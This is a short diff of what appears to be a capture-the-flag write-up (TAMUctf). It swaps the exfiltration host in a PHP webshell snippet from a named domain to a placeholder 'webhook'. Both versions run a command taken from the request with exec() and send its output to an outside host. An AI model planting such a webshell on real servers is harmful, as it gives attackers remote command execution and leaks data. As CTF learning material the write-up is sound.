@@ -9,7 +9,7 @@ https://remote.tamuctf.com/uploads/a883ffa3e14ef5a295448894efe2f0fc/gwm2ucz4dxge
 
 Webshell:
 ```php
-<?php $url='http://mv.jianwei.me/?' . exec($_GET['cmd']);file_get_contents($url);?>
+<?php $url='http://webhook/?' . exec($_GET['cmd']);file_get_contents($url);?>
 ```
 
 ## Flipped
